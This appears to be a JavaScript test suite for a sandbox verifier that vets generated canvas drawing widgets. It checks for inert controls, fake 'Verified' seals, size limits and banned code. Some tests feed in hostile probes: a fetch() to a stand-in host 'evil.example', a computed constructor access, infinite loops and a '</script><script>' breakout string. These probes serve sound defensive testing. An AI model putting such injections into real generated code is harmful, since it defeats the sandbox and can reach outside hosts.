import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

import { GOLD } from "../src/lib/liveart/gold.js";
import { SHOWCASE } from "../src/lib/liveart/showcase.js";
import { CANVAS_METHODS, CANVAS_PROPS, CSP, HOST, LIMITS, MATH_NAMES, SANDBOX, VERSION, liveOn } from "../src/lib/liveart/spec.js";
import { srcdoc } from "../src/lib/liveart/sandbox.js";
import { verifyWidget } from "../src/lib/liveart/verify.js";

const repo = fileURLToPath(new URL("../../..", import.meta.url));

function widget(draw, controls = [{ id: "a", label: "a", min: 0, max: 1, value: 0.5, step: 0.1 }]) {
  return {
    id: "probe",
    topic: "stddev",
    title: "Probe widget for the sandbox",
    explain: "Standard deviation probe used only to check the sandbox rejects a bad draw.",
    questions: [
      { q: "Does this control move the picture?", why: "the test checks the verifier, not a lesson" },
      { q: "Should a banned call mount?", why: "the sandbox has to refuse it" },
    ],
    controls,
    draw,
  };
}

test("spec matches contract.py", () => {
  const py = spawnSync("python3", ["-c", `
import json
from rrm.liveart.contract import VERSION, LIMITS, HOST, CANVAS_METHODS, CANVAS_PROPS, MATH_NAMES
print(json.dumps({
  "VERSION": VERSION,
  "LIMITS": LIMITS,
  "HOST": HOST,
  "CANVAS_METHODS": list(CANVAS_METHODS),
  "CANVAS_PROPS": list(CANVAS_PROPS),
  "MATH_NAMES": list(MATH_NAMES),
}))
`], { cwd: repo, encoding: "utf8" });
  assert.equal(py.status, 0, py.stderr);
  const got = JSON.parse(py.stdout);
  assert.equal(got.VERSION, VERSION);
  assert.deepEqual(got.LIMITS, LIMITS);
  assert.deepEqual(got.HOST, HOST);
  assert.deepEqual(got.CANVAS_METHODS, CANVAS_METHODS);
  assert.deepEqual(got.CANVAS_PROPS, CANVAS_PROPS);
  assert.deepEqual(got.MATH_NAMES, MATH_NAMES);
});

test("flag stays off unless asked", () => {
  assert.equal(liveOn({}), false);
  assert.equal(liveOn({ NEXT_PUBLIC_RRM_LIVE_ARTIFACTS: "1" }), true);
  assert.equal(liveOn({ RRM_LIVE_ARTIFACTS: "yes" }), true);
  assert.equal(liveOn({ NEXT_PUBLIC_RRM_LIVE_ARTIFACTS: "0" }), false);
});

test("gold draws pass the sandbox verifier", () => {
  for (const item of GOLD) {
    const report = verifyWidget(item);
    assert.equal(report.accept, true, item.id + " " + report.reasons.join(","));
  }
  assert.equal(verifyWidget(GOLD[0]).usesT, true);
  assert.equal(verifyWidget(GOLD[1]).usesT, false);
});

test("showcase figures pass and answer their claim", () => {
  for (const item of SHOWCASE) {
    const report = verifyWidget(item.widget, { claim: item.claim });
    assert.equal(report.accept, true, item.widget.id + " " + report.reasons.join(","));
  }
});

test("a control that does not move the picture is slop", () => {
  const draw = `function draw(ctx, state, t) {
    var w = state.w, h = state.h, a = state.a;
    var ignore = a * 0;
    ctx.fillStyle = "#f4efe5";
    ctx.fillRect(0, 0, w, h);
    ctx.fillStyle = "#0b6782";
    ctx.fillRect(20, 20, 80, 40 + ignore);
  }`;
  const report = verifyWidget(widget(draw));
  assert.equal(report.accept, false);
  assert.ok(report.reasons.includes("slop_inert:a"), report.reasons.join(","));
});

test("a control that only recolors the same shape is slop", () => {
  const draw = `function draw(ctx, state, t) {
    ctx.fillStyle = state.a > 0.5 ? "#c2321f" : "#0b6782";
    ctx.fillRect(20, 20, 80, 40);
  }`;
  const report = verifyWidget(widget(draw));
  assert.ok(report.reasons.includes("slop_inert:a"), report.reasons.join(","));
});

test("a draw that never reads the control is dead", () => {
  const draw = `function draw(ctx, state, t) {
    ctx.fillStyle = "#0b6782";
    ctx.fillRect(10, 10, state.w / 2, 40);
  }`;
  const report = verifyWidget(widget(draw));
  assert.ok(report.reasons.includes("dead_control"), report.reasons.join(","));
});

test("an unrelated claim is slop", () => {
  const report = verifyWidget(SHOWCASE[0].widget, { claim: "bleaching of coral reefs across the pacific ocean" });
  assert.ok(report.reasons.includes("slop_unrelated"), report.reasons.join(","));
});

test("fetch, computed constructor, and infinite loops never mount", () => {
  const fetched = verifyWidget(widget(`function draw(ctx, state, t) { fetch("https://evil.example"); ctx.fillRect(0,0,state.a,10); }`));
  assert.ok(fetched.reasons.includes("banned"), fetched.reasons.join(","));
  const computed = verifyWidget(widget(`function draw(ctx, state, t) { var x = ctx["constructor"]; ctx.fillRect(0,0,state.a,10); }`));
  assert.equal(computed.accept, false);
  const loop = verifyWidget(widget(`function draw(ctx, state, t) { var i = 0; while (true) { i = i + 1; } }`));
  assert.ok(loop.reasons.includes("step_cap"), loop.reasons.join(","));
  const forever = verifyWidget(widget(`function draw(ctx, state, t) { for (;;) { state.a; } }`));
  assert.ok(forever.reasons.includes("step_cap"), forever.reasons.join(","));
});

test("srcdoc is a sealed document", () => {
  const html = srcdoc('function draw(ctx, state, t) { ctx.fillRect(0,0,1,1); }\n</script><script>fetch("https://evil.example")</script>');
  assert.ok(html.includes(CSP));
  assert.equal(html.includes("</script><script>"), false);
  assert.equal(html.includes("allow-same-origin"), false);
  assert.equal(SANDBOX, "allow-scripts");
  assert.ok(html.includes("rrm-params"));
  assert.ok(html.includes("rrm-live"));
  const host = readFileSync(new URL("../src/lib/liveart/sandbox.js", import.meta.url), "utf8");
  assert.equal(host.includes("allow-same-origin"), false);
});

test("a string length can size a token, and other string methods cannot", () => {
  const draw = `function draw(ctx, state, t) {
    var word = "token", n = state.a;
    ctx.fillStyle = "#0b6782";
    ctx.fillRect(12, 12, word.length * (8 + n * 30), 36);
  }`;
  const report = verifyWidget(widget(draw));
  assert.equal(report.accept, true, report.reasons.join(","));
  const sliced = verifyWidget(widget(`function draw(ctx, state, t) {
    var word = "token";
    ctx.fillRect(12, 12, word.slice(0, 2).length * state.a, 20);
  }`));
  assert.equal(sliced.accept, false);
});

test("a number may use toFixed, and only up to six digits", () => {
  const draw = `function draw(ctx, state, t) {
    var label = (state.a * 10).toFixed(2);
    ctx.fillStyle = "#0b6782";
    ctx.fillRect(12, 12, label.length * (8 + state.a * 20), 28);
  }`;
  const report = verifyWidget(widget(draw));
  assert.equal(report.accept, true, report.reasons.join(","));
});

test("a verified seal painted on the canvas is slop", () => {
  const draw = `function draw(ctx, state, t) {
    ctx.fillStyle = "#0b6782";
    ctx.fillRect(10, 10, 20 + state.a * 40, 30);
    ctx.fillText("Verified ✓ from the paper", 16, 28);
  }`;
  const report = verifyWidget(widget(draw));
  assert.ok(report.reasons.includes("slop_seal"), report.reasons.join(","));
});

test("oversized draw is rejected", () => {
  const draw = "function draw(ctx, state, t) { ctx.fillRect(0,0,state.a,1); }" + " ".repeat(LIMITS.draw);
  const report = verifyWidget(widget(draw));
  assert.ok(report.reasons.includes("draw") || report.reasons.includes("size"));
});
